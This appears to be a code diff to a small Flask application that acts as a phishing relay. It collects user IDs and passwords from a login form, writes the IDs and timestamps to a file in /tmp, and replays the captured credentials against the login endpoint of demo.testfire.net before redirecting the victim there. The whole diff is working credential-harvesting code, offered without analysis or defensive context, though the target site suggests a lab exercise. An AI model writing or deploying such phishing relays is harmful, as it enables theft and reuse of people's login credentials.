@@ -2,6 +2,7 @@ import os
 import sys
 from flask import Flask, request, redirect
 from time import gmtime, strftime
+import requests
 
 app=Flask(__name__)
 
@@ -84,13 +85,15 @@ def handle_data():
         req = request.form
         uid = req.get('uid')
         passw = req.get('passw')
-        data = 'uid:'+uid+'password:'+passw + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
+        data = 'uid: '+uid+' password: ' + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
         file = open("/tmp/cookiedata.txt","a")
         file.write(data)
         file.close()
+        data={"uid":uid,"passw":passw,"btnSubmit":"Login"}
         
+        requests.post('http://demo.testfire.net/doLogin',data)
      
-    return redirect('http://demo.testfire.net/doLogin?uid='+uid+'&passw='+passw+'&btnSubmit=Login')
+    return redirect('http://demo.testfire.net')
 
 
 if __name__=="__main__":
